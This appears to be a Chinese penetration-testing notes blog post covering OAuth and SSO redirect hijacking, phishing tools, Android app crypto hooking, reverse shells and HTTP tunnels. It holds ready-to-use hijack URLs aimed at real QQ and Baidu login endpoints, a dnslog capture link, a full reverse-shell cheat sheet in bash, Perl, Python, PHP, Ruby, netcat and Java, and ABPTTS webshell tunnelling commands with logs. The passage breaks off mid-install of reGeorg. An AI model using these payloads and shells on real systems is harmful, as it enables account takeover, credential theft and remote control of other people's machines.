<p><img src="https://img-blog.csdnimg.cn/20200926200228823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>漏洞特点</strong></p>
<pre><code>1. oauth2.0快捷登录
2. sso单点登录系统
3. 注册或者登录
</code></pre>
<p><strong>oauth2.0快捷登录</strong></p>
<p>很多厂商使用了OAuth2.0的认证方式</p>
<p>利用场景：<br>
1、主站可第三方登录，漏洞站是否第三方登录都无影响<br>
2、一级域名下的某个信任域能够加载外部链接<br>
<img src="https://img-blog.csdnimg.cn/20200926200348617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926200354317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这是第三方登录的接口：</p>
<pre><code>https://graph.qq.com/oauth2.0/authorize?client_id=100312028&amp;response_type=code&amp;display=pc&amp;state=1516604022&amp;redirect_uri=https://passport.baidu.com/phoenix/account/afterauth?mkey=6f2d1d001e4be09e285ed6931751d0aa&amp;scope=get_user_info,get_other_info,add_t,add_share
</code></pre>
<p>这个链接是第三方登录口：</p>
<pre><code>https://passport.baidu.com/phoenix/account/afterauth?mkey=6f2d1d001e4be09e285ed6931751d0aa
</code></pre>
<p>现在分析参数：</p>
<pre><code>state=1516604022

redirect_uri=https://passport.baidu.com/phoenix/account/afterauth?mkey=6f2d1d001e4be09e285ed6931751d0aa
</code></pre>
<pre><code>redirect_uri参数：是要跳转到这个参数值网址。

在这里，我们将要跳转的网址替换到https://passport.baidu.com/phoenix/account/afterauth

？改为&amp;
</code></pre>
<pre><code>最后redirect_uri参数值是redirect_uri=带有外部链接的网址&amp;mkey=6f2d1d001e4be09e285ed6931751d0aa

注：带有外部链接的网址是一级域名的信任域！
</code></pre>
<p>payload 发给目标的url：</p>
<pre><code>https://graph.qq.com/oauth2.0/authorize?client_id=100312028&amp;response_type=code&amp;display=pc&amp;state=1516604022&amp;redirect_uri=带有外部链接的网址&amp;mkey=6f2d1d001e4be09e285ed6931751d0&amp;scope=get_user_info,get_other_info,add_t,add_share
</code></pre>
<p>目标只要打开该链接，并且点击头像登录。那么就会跳转到带有外部链接的网址</p>
<p>此时第三方登录会给用户一个code值，用户会带着code值去访问带有外部链接的网址 而带有外部链接的那个网址会自动加载外部链接，外部链接的作用就是获取referer那么黑客就会获取到code值。</p>
<p>最后劫持登录的payload：</p>
<p>访问第三方登录口</p>
<pre><code>https://passport.baidu.com/phoenix/account/afterauth?mkey=868b9c0330c56e46a27c8da7f75708d1&amp;code=获取到的code值&amp;state=1516505635
</code></pre>
<p>再访问http://www.baidu.com成功登录目标账户</p>
<p><strong>sso单点登录</strong></p>
<p>单点登录（Single Sign On），简称为 SSO，是目前比较流行的企业业务整合的解决方案之一。SSO的定义是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统</p>
<p><img src="https://img-blog.csdnimg.cn/20200926200717710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
漏洞点：www.domain.com -&gt; aaa.domain.com 当A用户登录了www.domain.com后，访问aaa.domain.com无需账号密码，sso会发送凭证给aaa.domain.com。</p>
<p>劫持：抓取sso发送给aaa.domain.com凭证的数据包，将跳转到aaa.domain.com这个值改为我们的dnslog地址。然后将这个链接发送给已经登录www.domain.com的A用户，那么A用户会往aaa.domain.com发送凭证，这时候就被我们的dnslog劫持了<br>
<img src="https://img-blog.csdnimg.cn/20200926200741252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926200747307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926200757429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926200804127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926200810797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926200823657.png#pic_center" alt="在这里插入图片描述"><br>
<strong>注册登录</strong></p>
<p>新用户注册或者用户登录的时候，网站会传递凭证给用户。这时候通过修改redirect_url为自己的dnslog，去劫持凭证</p>
<pre><code>https://aaa.xxxxx.com/MxkEngine/mobilePage/xxdc_register_login/xxdc_login.html?jumpURL=http://www2.hg8l7g.ceye.io?aaa.xxxxx.com/MxkEngine/mobilePage/xxdc_issue/xxdc_ReceiveNoPayment.html?userid=#
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020092620085676.png#pic_center" alt="在这里插入图片描述"><br>
成功跳转到www…<br>
<img src="https://img-blog.csdnimg.cn/20200926200937818.png#pic_center" alt="在这里插入图片描述"><br>
<strong>修复建议</strong></p>
<p>对跳转的url地址做限制。</p>
<p>加强域名后输入的字符长度，以及URL地址后的http以及.com.cn等域名字符的限制与安全过滤，对以及特殊的字符以及参数值也加强过滤，比如：redirect，jump,redurl，等参数值的过滤</p>
<p>文章：</p>
<pre><code>https://cn-sec.com/archives/69153.html
https://sec.thief.one/article_content?a_id=a6dd0c77f46b5dd7030c79d3e24f804a
</code></pre>
<p>雷神众测原文被删了好像…</p>
<hr>
<h2><a id="2334__6419"></a>2.3.3.4 克隆技术</h2>
<p>克隆技术 - Clone</p>
<p>Kali linux - setookit<br>
<img src="https://img-blog.csdnimg.cn/20200926201509838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926201607750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020092620195090.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200926201751498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://www.jianshu.com/p/6df51799cd9d  ---基础介绍钓鱼

https://blog.csdn.net/qq_39379812/article/details/90679722   --复现、实战

https://blog.51cto.com/13587123/2151193   --老文章
</code></pre>
<hr>
<h2><a id="2335_Word_6438"></a>2.3.3.5 Word文档-云宏代码钓鱼</h2>
<p><img src="https://img-blog.csdnimg.cn/2020092620323455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://cloud.tencent.com/developer/article/1518725

https://xz.aliyun.com/t/2496
</code></pre>
<p>两篇复现~~</p>
<hr>
<h2><a id="24_APP_6449"></a>2.4 APP密码算法通用分析方法</h2>
<p><strong>前言</strong></p>
<p>1）在APP测试过程经常会遇到报文被加密的情况，之前在大部分的情况，可能需要进行脱壳，逐行分析代码，获取算法，编写解密的程序（工具）—— 适用于任何情况下的万能解法</p>
<p>2）因为过程实在是有些繁琐，文章里是我尝试分析app加密算法的一些取巧的方式，可以进行尝试</p>
<h2><a id="_6456"></a>密码算法介绍</h2>
<p><strong>密码算法强度依赖</strong></p>
<p>1）密码算法源头可以追溯到古典算法。 一般而言古典算法依赖于两种方式——移位和代换混淆明文，从而无法破译。但是对于大多数的古典密码而言，其加密强度依赖于算法保密性以及密钥保密</p>
<p>2）但是对于现代密码学而言，加密强度完全依赖于密钥（算法在某种程度上一定会被获取，而设计好的算法存在一定的难度）</p>
<p>3）对于我想要做的app算法分析而言，我在大部分的情况是在寻找密钥。找到密钥，套用几个现代密码学算法，完成分析</p>
<p><strong>涉及概念</strong></p>
<p>我在实际的接触过程中，大部分的人其实对于密码涉及到的相关概念其实认识的很模糊，经常统称为密码算法，这里进行简单的介绍</p>
<p><strong>Hash算法（哈希算法）</strong></p>
<p>1）常见的包括md5、sha1、sm3。 这类算法主要对信息进行摘要，从摘要两个字应该能够意识到进行这种算法获取的数据无法还原成原来的信息，因为只保存了部分数据</p>
<p>2）那么我们常说的md5解密、sha1解密，又是什么呢？其实这是在说明一类情况 Hash碰撞，—— A通过hash函数生成了C，B也通过hash函数生成了C，这样一种情况。由于hash字符串的空间几乎无限大，那么我们可以理解A与B是相同的内容，所以说C通过md5解密生成了B 。我们通过提交B来代替A——对于接受对象而言的输出都是C所以是一致的（当然实际上A，B也可以不同，具体可以了解下王小云破解md5）</p>
<p><strong>编码算法</strong></p>
<p>这一类就比较容易和密码算法混淆了，这类算法主要是为了解决传输或者转换过程中可能出现的错乱。 一般而言没有密钥这样的说法，就是规定了一套编码和解码的算法，常见算法有base64、十六进制字符串</p>
<p><strong>密码算法</strong></p>
<p>1）其实到现在为止，密码算法一般指的就是现代密码学——几类对称密码和非对称密码</p>
<p>2）两者的区别就在于，加密和解密的密钥是否能够互相还原</p>
<p><strong>分组算法（block cipher mode）</strong><br>
1）密码算法都是针对具体的块进行加密，多个块之间怎么连接，就是分组算法</p>
<p>2）例如ECB、CBC等，具体可以去wiki 搜索 block cipher mode</p>
<p><strong>填充模式</strong><br>
长度不够的块，怎么填充</p>
<h2><a id="_6494"></a>分析原理</h2>
<p>为什么我们在理论上一定能够突破密码算法？ 我作为客户端的角色进行操作，理论上我能控制客户端所有的内容。数据在客户端完成加密、发送。  只要客户端能够提供加密的能力，我理论上也能</p>
<p>既然我们不想要直接分析应用app的源代码，那么我们能够工程化控制的就是执行环境，就说下图架构中除了application的所有内容<br>
<img src="https://img-blog.csdnimg.cn/20200926204137605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">	<br>
众所周知，越到下面难度越高，数据被处理和变化也越多</p>
<p>当然这里比较好的消息是，大部分应用调用了java扩展包中的加密算法。那我们是不是能够通过hook相关的函数来获取密码算法的调用情况呢？</p>
<p>PS: 大佬们都已经整完了，上工具，丢掉脑袋，当个tool man</p>
<p><strong>工具准备</strong></p>
<p>1）Xposed<br>
2）<a href="https://github.com/P4nda0s/CryptoFucker">CryptoFucker</a>  ,可以稍微改一改代码更加好用。<br>
3）<a href="https://github.com/ac-pm/Inspeckage">inspeckage</a><br>
4）<a href="https://github.com/lyxhh/lxhToolHTTPDecrypt">lxhToolHTTPDecrypt</a></p>
<p><strong>分析过程</strong></p>
<p>PS： 我想这个正文可能是最短的正文了——工具流水线</p>
<p><strong>inspeckage</strong></p>
<p>使用inspeckage加载app，查看调用情况以及一些其他属性<br>
<img src="https://img-blog.csdnimg.cn/20200926204453839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
点到crypto模块下，可以看到使用加密算法的情况<br>
<img src="https://img-blog.csdnimg.cn/20200926204507461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
密钥是：B9DC7BFD361F8348 IV: nmeug.f9/Om+L823 算法是Java 默认的AES</p>
<p>从列表里也可以看到，密码没有打印调用栈，有时候可能不清楚哪个数据包是正确的（SDK、本地数据等等都可能调用密码算法）</p>
<p><strong>CryptoFucker</strong></p>
<p>通过hook，输出到ydsec文件夹下，把应用包名作为文件名</p>
<p>运行后，可以查看相关的信息，定位调用栈（后续可以修改相关代码）<br>
<img src="https://img-blog.csdnimg.cn/20200926204548490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926204557293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>总结</strong></p>
<p>其他类似工具都自己去尝试吧，上述工具都是github上的，可以根据自己的需要去修订一个合适的版本</p>
<p><strong>常见的算法组合</strong></p>
<pre><code>AES/DES

仅仅采用AES，密钥可能通过简单的编码或者置换存放在数据包中

硬编码在应用当中，这类情况用文中的方式较容易解决
</code></pre>
<pre><code>RSA + AES

通过RSA加密AES密钥，与客户端进行协商，或者保存在数据包中
</code></pre>
<pre><code>添加MAC

MAC（消息认证码），数据包的hash值作为数据包一部分。一般hash算法采用md5或者sha-1
</code></pre>
<p><strong>加解密</strong></p>
<p>知道相关密钥信息和IV等信息，就按照提前准备好的密码工具进行加解密即可</p>
<p><img src="https://img-blog.csdnimg.cn/20200926204747541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://my.oschina.net/u/4587690/blog/4571625     --原文
</code></pre>
<hr>
<h2><a id="25_Linuxshe_6571"></a>2.5 Linux下反弹she命令</h2>
<p>Hackthebox经典提权：</p>
<p><strong>Bash</strong><br>
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</p>
<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</code></pre>
<p><strong>PERL</strong><br>
Here’s a shorter, feature-free version of the perl-reverse-shell:</p>
<pre><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre>
<p>There’s also an alternative PERL revere shell here.</p>
<p><strong>Python</strong><br>
This was tested under Linux / Python 2.7:</p>
<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre>
<p><strong>PHP</strong><br>
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…</p>
<pre><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre>
<p>If you want a .php file to upload, see the more featureful and robust php-reverse-shell.</p>
<p><strong>Ruby</strong></p>
<pre><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
</code></pre>
<p><strong>Netcat</strong><br>
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
<pre><code>nc -e /bin/sh 10.0.0.1 1234
</code></pre>
<p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p>
<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</code></pre>
<p><strong>Java</strong></p>
<pre><code>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
</code></pre>
<p>[Untested submission from anonymous reader]</p>
<p><strong>xterm</strong><br>
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre><code>xterm -display 10.0.0.1:1
</code></pre>
<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
<pre><code>Xnest :1
</code></pre>
<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
<pre><code>xhost +targetip
</code></pre>
<hr>
<pre><code>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet   --参考文章
</code></pre>
<hr>
<p>shell文章：</p>
<pre><code>https://www.cnblogs.com/p0pl4r/p/10643541.html 

https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html

https://xz.aliyun.com/t/2548  --Linux反弹shell（一）文件描述符与重定向
https://xz.aliyun.com/t/2549   --Linux 反弹shell（二）反弹shell的本质
</code></pre>
<p>打过靶机的应该都会…</p>
<hr>
<h2><a id="26_Browser_Pivot_for_Chrome_6671"></a>2.6 Browser Pivot for Chrome</h2>
<pre><code>https://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/     --全英文篇

https://xz.aliyun.com/t/4417    --Browser Pivot for Chrome

https://blog.csdn.net/weixin_44677409/article/details/102725129   --Cobalt Strike使用教程一

https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf   --CS非常详细教程  pdf版本，感谢QAX
</code></pre>
<p>还可以参考书籍…</p>
<hr>
<p>到这里就结束打入内网的篇章了，将开启命令篇章!</p>
<hr>
<h1><a id="dayuEleventh_Day_6689"></a>三、命令与控制（dayu-Eleventh Day）</h1>
<h2><a id="31_HTTP__ABPTTS_6690"></a>3.1 HTTP 隧道 ABPTTS</h2>
<p><strong>ABPTTS简介：</strong></p>
<p>ABPTTS是NCC Group在2016年blackhat推出的一款将TCP流量通过HTTP/HTTPS进行流量转发，在目前云主机的大环境中，发挥了比较重要的作用，可以通过脚本进行RDP,SSH,Meterpreter的交互与连接。也意味着这样可以建立一个通过80端口得流量出站来逃避防火墙。与其它http隧道不同的是，abptts是全加密。</p>
<p><strong>2016年blackhat介绍：</strong></p>
<pre><code>https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun
</code></pre>
<p><strong>Github：</strong></p>
<pre><code>https://github.com/nccgroup/ABPTTS
</code></pre>
<p><strong>安装与生成payload：</strong></p>
<pre><code>root@John:~# git clone https://github.com/nccgroup/ABPTTS.git
Cloning into 'ABPTTS'...
remote: Enumerating objects: 50, done.
remote: Total 50 (delta 0), reused 0 (delta 0), pack‐reused 50
Unpacking objects: 100% (50/50), done.
root@John:~# pip install pycrypto
Requirement already satisfied: pycrypto in /usr/lib/python2.7/dist‐packages (2.6.1)
root@John:~# cd ABPTTS/
root@John:~/ABPTTS# ls
abpttsclient.py abpttsfactory.py ABPTTS‐Manual.pdf data libabptts.py license.txt README.md settings_overlays template
root@John:~/ABPTTS# python abpttsfactory.py ‐o webshell
[2019‐01‐28 08:24:28.131919] ‐‐‐===[[[ A Black Path Toward The Sun ]]]===‐‐‐
[2019‐01‐28 08:24:28.131954] ‐‐==[[ ‐ Factory ‐ ]]==‐‐
[2019‐01‐28 08:24:28.131965] Ben Lincoln, NCC Group
[2019‐01‐28 08:24:28.131979] Version 1.0 ‐ 2016‐07‐30
[2019‐01‐28 08:24:28.132706] Output files will be created in "/root/ABPTTS/webshell"
[2019‐01‐28 08:24:28.132722] Client‐side configuration file will be written as "/root/ABPTTS/webshell/config.txt"
[2019‐01‐28 08:24:28.132739] Using "/root/ABPTTS/data/american‐english ‐lowercase‐4‐64.txt" as a wordlist file
[2019‐01‐28 08:24:28.136713] Created client configuration file "/root/ABPTTS/webshell/config.txt"
[2019‐01‐28 08:24:28.137760] Created server file "/root/ABPTTS/webshell/abptts.jsp"
[2019‐01‐28 08:24:28.138342] Created server file "/root/ABPTTS/webshell/abptts.aspx"
[2019‐01‐28 08:24:28.138492] Created server file "/root/ABPTTS/webshell/war/WEB‐INF/web.xml"
[2019‐01‐28 08:24:28.138555] Created server file "/root/ABPTTS/webshell/war/META‐INF/MANIFEST.MF"
[2019‐01‐28 08:24:28.139128] Prebuilt JSP WAR file: /root/ABPTTS/webshell/scabGroup.war
[2019‐01‐28 08:24:28.139140] Unpacked WAR file contents:/root/ABPTTS/webshell/war
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926221736914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<p>以aspx为demo</p>
<p><img src="https://img-blog.csdnimg.cn/20200926221826340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>攻击机执行：</strong></p>
<p>注：如果攻击机为vps，则 -f 需要填写vps_ip:port/目标机:port</p>
<pre><code>python abpttsclient.py ‐c webshell/config.txt ‐u "http://192.168.1.119/abptts.aspx" ‐f 192.168.1.5:33389/192.168.1.119:3389
</code></pre>
<pre><code>root@John:~/ABPTTS# python abpttsclient.py ‐c webshell/config.txt ‐u "http://192.168.1.119/abptts.aspx" ‐f 192.168.1.5:33389/192.168.1.119:3389
[2019‐01‐28 08:33:25.749115] ‐‐‐===[[[ A Black Path Toward The Sun ]]]===‐‐‐
[2019‐01‐28 08:33:25.749153] ‐‐==[[ ‐ Client ‐ ]]==‐‐
[2019‐01‐28 08:33:25.749160] Ben Lincoln, NCC Group
[2019‐01‐28 08:33:25.749169] Version 1.0 ‐ 2016‐07‐30
[2019‐01‐28 08:33:25.750372] Listener ready to forward connections from 192.168.1.5:33389 to 192.168.1.119:3389 via http://192.168.1.119/abptts.aspx
[2019‐01‐28 08:33:25.750392] Waiting for client connection to 192.168.1.5:33389
[2019‐01‐28 08:33:28.560180] Client connected to 192.168.1.5:33389
[2019‐01‐28 08:33:28.560365] Waiting for client connection to 192.168.1.5:33389
[2019‐01‐28 08:33:28.560655] Connecting to 192.168.1.119:3389 via http://192.168.1.119/abptts.aspx
[2019‐01‐28 08:33:28.868187] Server set cookie ASP.NET_SessionId=boyfcepcijf43s0dhaz5of05; path=/; HttpOnly
[2019‐01‐28 08:33:28.868269] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8861 (Connection ID: CEA116F4AF1FAF8C)] Server created connection ID CEA116F4AF1FAF8C
[2019‐01‐28 08:33:29.077903] Connection‐level exception: [Errno 104] Connection reset by peer in thread for tunnel (192.168.1.3:8861 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)
[2019‐01‐28 08:33:29.077967] Disengaging tunnel (192.168.1.3:8861 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)
[2019‐01‐28 08:33:29.077987] Closing client socket (192.168.1.3:8861 ‐ &gt; 192.168.1.5:33389)
[2019‐01‐28 08:33:29.078049] Exception while closing client socket (192.168.1.3:8861 ‐&gt; 192.168.1.5:33389): [Errno 107] Transport endpoint is not connected
[2019‐01‐28 08:33:29.085280] Server closed connection ID CEA116F4AF1FAF8C
[2019‐01‐28 08:33:36.957446] Client connected to 192.168.1.5:33389
[2019‐01‐28 08:33:36.957601] Waiting for client connection to 192.168.1.5:33389
[2019‐01‐28 08:33:36.957797] Connecting to 192.168.1.119:3389 via http://192.168.1.119/abptts.aspx
[2019‐01‐28 08:33:36.966507] Server set cookie ASP.NET_SessionId=bsynuc3l5ndo5h0n0bhtrv5p; path=/; HttpOnly
[2019‐01‐28 08:33:36.966587] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8862 (Connection ID: AA0FE7F073A5EFFD)] Server created connection ID AA0FE7F073A5EFFD
[2019‐01‐28 08:33:45.321612] [(C2S) 192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389 (Connection ID: AA0FE7F073A5EFFD)]: 25805 bytes sent since last report
[2019‐01‐28 08:33:45.321700] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8862 (Connection ID: AA0FE7F073A5EFFD)] 12344 bytes sent since last report
[2019‐01‐28 08:33:48.482758] [(C2S) 192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389 (Connection ID: AA0FE7F073A5EFFD)]: 715 bytes sent since last report
[2019‐01‐28 08:33:48.482838] [(S2C) 192.168.1.119:3389 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.3:8862 (Connection ID: AA0FE7F073A5EFFD)] 2524 bytes sent since last report
[2019‐01‐28 08:33:54.169354] Connection‐level exception: [Errno 104] Connection reset by peer in thread for tunnel (192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)
[2019‐01‐28 08:33:54.169432] Disengaging tunnel (192.168.1.3:8862 ‐&gt; 192.168.1.5:33389 ‐&gt; 192.168.1.119:3389)
[2019‐01‐28 08:33:54.169455] Closing client socket (192.168.1.3:8862 ‐ &gt; 192.168.1.5:33389)
[2019‐01‐28 08:33:54.169529] Exception while closing client socket (192.168.1.3:8862 ‐&gt; 192.168.1.5:33389): [Errno 107] Transport endpoint is not connected
[2019‐01‐28 08:33:54.178078] Server closed connection ID AA0FE7F073A5EFFD
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926221930579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926221942524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
复现！！提示目前不支持PHP</p>
<pre><code>https://micro8.gitbook.io/micro8/contents-1/91-100/96http-sui-dao-abptts-di-yi-ji
</code></pre>
<hr>
<h2><a id="32_HTTP__reGeorg_6792"></a>3.2 HTTP 隧道 reGeorg</h2>
<p>reGeorg 的前身是2008年 SensePost 在 BlackHat USA 2008 的 reDuh 延伸与扩展。也是目前安全从业人员使用最多，范围最广，支持多丰富的一款 http 隧道。从本质上讲，可以将 JSP/PHP/ASP/ASPX 等页面上传到目标服务器，便可以访问该服务器后面的主机。</p>
<p><strong>2014年blackhat介绍</strong></p>
<pre><code>https://www.blackhat.com/eu-14/arsenal.html#regeorg
</code></pre>
<p><strong>Github：</strong></p>
<pre><code>https://github.com/sensepost/reGeorg
</code></pre>
<p>攻击机：<br>
192.168.1.5 Debian<br>
192.168.1.4 Windows 7<br>
靶机：<br>
192.168.1.119 Windows 2003<br>
安装：</p>
<pre><code>root@John:~# git clone https://github.com/sensepost/reGeorg.git
Cloning into 'reGeorg'...
remote: Enumerating objects: 85, done.
remote: Total 85 (delta 0), reused 0 (delta 0), pack‐reused 85
Unpacking objects: 100% (85/85), done.
root@John:~# cd reGeorg/
